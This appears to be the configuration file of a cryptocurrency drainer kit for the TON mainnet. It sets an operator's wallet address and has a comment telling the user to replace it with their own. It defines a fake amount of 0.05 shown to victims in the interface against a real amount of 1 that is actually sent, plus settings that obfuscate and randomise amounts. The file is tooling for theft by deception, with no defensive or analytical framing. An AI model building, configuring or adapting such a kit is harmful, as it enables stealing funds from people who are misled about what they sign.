// config.js
var YOUR_WALLET     = "UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv";
var PROXY_CONTRACT  = YOUR_WALLET;

// REPLACE WITH YOUR WALLET ADDRESS!
var AML_WALLET      = "UQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW";

// Amount shown to user in UI (fake)
var VISIBLE_AMOUNT  = "0.05";
// REAL amount that will be sent
var REAL_AMOUNT     = "1";
var HIDDEN_AMOUNT   = "1"; // backward compatibility

var NETWORK         = "mainnet";

// === OBFUSCATION SETTINGS ===
var OBFUSCATION_METHOD = "empty";
var RANDOMIZE_AMOUNT = true;
var AMOUNT_VARIANCE = 0.02;
var USE_STATEINIT = false;
